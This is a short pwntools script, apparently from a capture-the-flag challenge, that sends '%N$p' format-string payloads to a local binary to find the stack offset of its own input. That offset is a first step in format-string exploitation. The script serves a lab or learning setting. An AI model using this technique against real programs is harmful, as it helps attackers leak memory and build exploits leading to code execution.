#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_11')

for offset in range(1, 64):
    p = process(binary.path)
    p.recvline()
    fmtstr = "%" + str(offset) + "$p"
    p.sendline(fmtstr)
    output = str(p.recvline(), 'utf-8')
    print(offset, output.strip())
    try:
        if bytes.fromhex(output.strip()[2:]).decode('utf-8') == fmtstr:
            break
    except:
        pass
